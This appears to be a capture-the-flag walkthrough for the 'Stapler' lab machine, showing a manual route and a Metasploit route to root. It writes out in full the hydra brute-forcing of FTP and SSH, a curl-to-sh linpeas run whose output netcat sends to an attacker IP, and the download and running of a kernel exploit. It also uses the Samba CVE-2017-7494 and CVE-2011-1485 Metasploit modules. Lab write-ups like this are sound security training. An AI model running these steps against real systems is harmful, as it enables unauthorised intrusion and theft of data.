# Stapler --- PG Play
## [_Manual Exploitation_]
### Scan
First I assigned a value to `targ3t` variable in bash and passed it the IP address of the machine to make it easier to operate:
```
targ3t=192.168.247.148
```
Then I did an aggressive scan on the target using `nmap`:
```
nmap -A $targ3t -oN nmap.scan -vv
```
The scan shows that `ftp` on port `21` allows anonymous login. Let's take a look what it has:
```
ftp $targ3t 21
```
As username fill in `anonymous` and skip the password. Now that you're in type `ls`. You can see that there is a `note` file. Let's download it:
```
get note
```
Let's quit the ftp shell and see what's in the note:
```
cat note
```
### FTP
We can see two users, Elly and John are on this ftp server. Let's brute force Elly's password using `hydra`:
```
hydra -l elly -e nsr $targ3t
```
It appears that elly's password is `ylle`. How predictable. Let's check out elly's ftp account:
```
ftp $targ3t 21
```
Fill in the username and password accordingly and once in, type `ls`. We can see that there are a lot of files but more importantly there are `passwd` and `shadow` files there. Unfortunately we don't have the permissions to download `shadow`, but we can download `passwd`:
```
get passwd
```
Let's see what's inside:
```
cat passwd
```
Generic `passwd` file with lots of users, let's isolate them into a list file:
```
cat passwd | awk -F: '{print $1}' > usernames
```
Now let's try to brute force their passwords for `ssh` using `hydra`:
```
hydra -t 4 -L usernames -e nsr $targ3t
```
### SSH
Looks like a user `SHayslett` has their username as password! Let's ssh as this user:
```
ssh SHayslett@$targ3t
```
And we're in! Let's look for a flag:
```
ls /home
```
There's a file named `local.txt`, let's read it:
```
cat /home/local.txt
```
### PrivEsc
That's our first flag! Now let's try and escalate some privileges. Let's load linpeas from public github into the machine and save the output on the local machine. First on the local machine type:
```
nc -lvnp 9002 | tee linpeas.out
```
Then on the host machine type:
```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | nc <local machine IP> 9002
```
Let's explore the linpeas output:
```
less linpeas.out
```
It seems that the operating system is `Ubuntu 16.04`. Let's search exploits for it:
```
searchsploit Ubuntu 16.04
```
Let's try the `39772.txt` exploit for this one:
```
cat /usr/share/exploitdb/exploits/linux/local/39772.txt
```
Let's use the link to a zip file indicated in the txt, download it to a target machine and run it:
```
cd $(mktemp -d)
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
unzip 39772.zip
cd 39772
tar -xvf exploit.tar
cd ebpf*
./compile.sh
./doubleput
```
And we're root! Let's find a root flag:
```
ls /root
cd /root
```
Let's read `flag.txt`:
```
cat flag.txt
```
Okay... Let's read another txt file `proof.txt`:
```
cat proof.txt
```
This is our root flag!

## [_Metasploit Exploitation_]
### Scan
Start postgresql server:
```
systemctl start postgresql
```
Create and initialize the msf database:
```
msfdb init
```
Start up metasploit console:
```
msfconsole
```
When in the console confirm you are successfully connected to the metasploit database:
```
db_connect
```
Create a new workspace:
```
workspace -a stapler
```
Let's scan the host with `db_nmap`:
```
db_nmap -A 192.168.175.148
```
Check out hosts and services it saved to the database:
```
hosts
services
```
### SMB
As we can see there's a `Samba smbd 4.3.9-Ubuntu` on port 139. Let's check if it is vulnerable to anything by going to [CVEdetails.com](https://www.cvedetails.com) trying to find vulnerabilities with public exploits that affect this version of Samba. We quickly find `CVE-2017-7494`, which looks good. Let's find a corresponding exploit in metasploit console:
```
search cve:cve-2017-7494
```
Let's choose the first result we found:
```
use 0
```
Set RHOSTS to IP of our target from the database:
```
hosts -R
```
Let's checkout if any other options are needed for this exploit:
```
options
```
The port needs to be changed from 445 to 139:
```
set RPORT 139
```
Now we're all set. Let's run the exploit
```
run
```
In a minute we gained a remote shell. Let's try to turn it into a meterpreter by backgrounding this shell with `Ctrl+Z` and looking for a corresponding post exploitation module:
### Meterpreter
```
search shell_to_meterpreter
```
Let's choose the only result we've got:
```
use 0
```
Let's see the options it needs:
```
options
```
Let's set LHOST (even though it's not required) to our desired local IP. Now let's see how many sessions we have and try to identify which ones is our shell session from previous exploit:
```
sessions
```
Looks like we have one session and session id for our shell session is 1. Let's set that as Session option for this post exploitation module:
```
set SESSION 1
```
Now let's run the module and wait for it to act. The shell session has been upgraded. The meterpreter session is now under the session ID 2. We can switch to that session by typing:
```
sessions -i 2
```
### PrivEsc
Let's try to find a way to escalate privileges. On your local machine, start a netcat listener:
```
nc -lvnp 9002 | tee linpeas.out
```
Now type `shell` in meterpreter to access the exploited machine's local shell and type:
```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | nc 192.168.45.192 9002
```
Get out of the shell by `Ctrl+C` back to meterpreter. On your local machine, find CVEs that could be useful:
```
grep -P "CVE-[0-9]+-[0-9]+" linpeas.out
```
One of the CVEs that stood out to me was `CVE-2011-1485`. Let's get out of the meterpreter shell with `Ctrl+Z` and search for that CVE in metasploit:
```
search cve:cve-2011-1485
```
Let's choose the only result:
```
use 0
```
Let's see the options it needs:
```
options
```
Make sure all options (LHOST especially) are correct and set SESSION to your desired meterpreter session (ID: 2)
```
set SESSION 2
```
Now let's run the module:
```
run
```
And we received our new meterpreter shell as `root`! To confirm it is indeed root, you can type `shell` to enter the system's default shell from meterpreter and type `whoami`:
```
shell
whoami
```
This should return root. Now read both flags:
```
cat /home/local.txt
cat /root/proof.txt
```
Nice!
